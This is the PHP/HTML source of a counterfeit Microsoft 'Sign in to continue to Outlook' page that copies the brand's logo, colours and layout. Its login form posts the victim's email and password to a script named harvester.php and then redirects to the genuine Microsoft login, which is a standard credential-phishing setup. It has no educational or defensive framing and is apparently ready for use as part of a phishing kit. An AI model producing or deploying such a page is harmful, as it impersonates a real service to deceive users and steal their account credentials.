<?php
require_once __DIR__ . '/config.php';
$cfg = require __DIR__ . '/config.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your account</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;width:440px;max-width:100%;padding:44px 48px 36px;box-shadow:0 2px 6px rgba(0,0,0,.15)}
.logo{margin-bottom:24px}
.logo svg{width:108px;height:24px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:8px}
.sub{font-size:15px;color:#1b1b1b;margin-bottom:24px}
.field input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;outline:none;margin-bottom:24px;background:transparent}
.field input:focus{border-bottom:2px solid #0067b8}
.row{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
.row a{color:#0067b8;font-size:13px;text-decoration:none}
.row a:hover{text-decoration:underline}
.actions{display:flex;justify-content:flex-end;gap:8px}
button{background:#0067b8;color:#fff;border:none;padding:8px 20px;font-size:15px;cursor:pointer;border-radius:2px}
button:hover{background:#005a9e}
button.secondary{background:transparent;color:#0067b8;border:1px solid #8a8886}
.foot{margin-top:40px;font-size:12px;color:#666;text-align:center}
.foot a{color:#666;text-decoration:none;margin:0 6px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
      <rect x="0" y="0" width="11" height="11" fill="#f25022"/>
      <rect x="13" y="0" width="11" height="11" fill="#7fba00"/>
      <rect x="0" y="13" width="11" height="11" fill="#00a4ef"/>
      <rect x="13" y="13" width="11" height="11" fill="#ffb900"/>
      <text x="30" y="18" font-family="Segoe UI" font-size="18" fill="#737373">Microsoft</text>
    </svg>
  </div>
  <h1>Sign in</h1>
  <div class="sub">to continue to Outlook</div>
  <form method="POST" action="harvester.php?next=https://login.microsoftonline.com">
    <div class="field"><input type="email" name="email" placeholder="Email, phone, or Skype" autocomplete="username" required></div>
    <div class="field"><input type="password" name="pass" placeholder="Password" autocomplete="current-password" required></div>
    <div class="row">
      <a href="#">No account? Create one!</a>
      <a href="#">Can't access your account?</a>
    </div>
    <div class="actions">
      <button class="secondary" type="button">Back</button>
      <button type="submit">Sign in</button>
    </div>
  </form>
</div>
<div class="foot">
  <a href="#">Terms of use</a>
  <a href="#">Privacy &amp; cookies</a>
</div>
</body>
</html>
